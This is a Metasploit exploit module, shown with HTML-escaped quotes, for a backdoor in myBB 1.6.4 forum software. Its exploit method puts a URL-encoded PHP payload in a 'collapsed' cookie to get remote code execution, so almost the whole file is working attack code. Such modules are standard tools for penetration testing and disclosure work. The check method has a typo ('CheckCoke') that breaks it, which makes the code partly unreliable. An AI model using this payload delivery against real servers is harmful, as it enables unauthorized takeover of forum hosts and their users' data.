# $Id: mybb_backdoor.rb 13838 2011-10-09 03:22:07Z todb $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;myBB 1.6.4 Backdoor Exploit&#039;,
            &#039;Description&#039;    => %q{
                    myBB is a popular open source PHP forum software. Version 1.6.4 contained an
                    unauthorized backdoor, distributed as part of the vendor&#039;s source package.
            },
            &#039;Author&#039;    =>
                [
                    &#039;tdz&#039;,
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13838 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;49993&#039;  ],
                    [ &#039;SECUNIA&#039;, &#039;46300&#039; ],
                    [ &#039;URL&#039;, &#039;http://blog.mybb.com/2011/10/06/1-6-4-security-vulnerabilit/&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 4000,
                    &#039;DisableNops&#039; => true,
                    &#039;Keys&#039;        => [&#039;php&#039;],
                },
            &#039;Targets&#039;        => [ [&#039;Automatic&#039;, { }], ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 06 2011&#039;
            ))
 
            register_options(
                [
                    OptString.new(&#039;URI&#039;,    [ true, "myBB path", &#039;/index.php&#039;]),
                ], self.class)
    end
 
 
    def uri
        datastore[&#039;URI&#039;]
    end
 
    def check
        print_status("Checking target")
        res = send_request_raw(
            {&#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039; => uri},
            10
        )
        if (not res) or (not res.code.between?(200,299))
            return Exploit::CheckCode::Safe
        else
            return Exploit::CheckCoke::Detected
        end
    end
 
    def exploit
     
        print_status("Sending exploit request")
 
        # See the patch at http://blog.mybb.com/wp-content/uploads/2011/10/mybb_1604_patches.txt
        # for details of the backdoor mechanism.
        cookie = "collapsed=0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|"
        cookie << Rex::Text.uri_encode(payload.encoded)
         
        response = send_request_raw({
            &#039;method&#039;  => &#039;GET&#039;,
            &#039;global&#039; => true,
            &#039;uri&#039; => uri,
            &#039;headers&#039; =>
                {
                    &#039;Cookie&#039; => cookie,
                }
        },10)
 
        if (not response) or (not response.code.between?(200,299))
            print_error "Cannot connect to #{uri} on #{datastore[&#039;RHOST&#039;]}, got #{response ? response.code : &#039;no response&#039;}."
        else
            handler
        end
 
    end
end



